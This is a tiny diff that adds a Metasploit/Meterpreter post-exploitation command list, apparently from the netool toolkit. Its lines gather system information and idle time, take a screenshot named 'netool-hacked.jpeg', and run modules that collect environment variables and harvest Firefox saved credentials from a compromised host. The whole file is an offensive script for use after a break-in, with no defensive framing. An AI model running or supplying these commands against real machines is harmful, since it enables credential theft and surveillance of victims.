@@ -1,0 +1,6 @@
+sysinfo
+idletime
+lpwd
+screenshot -v -p /root/netool-hacked.jpeg -v true
+run post/multi/gather/env
+run post/multi/gather/firefox_creds
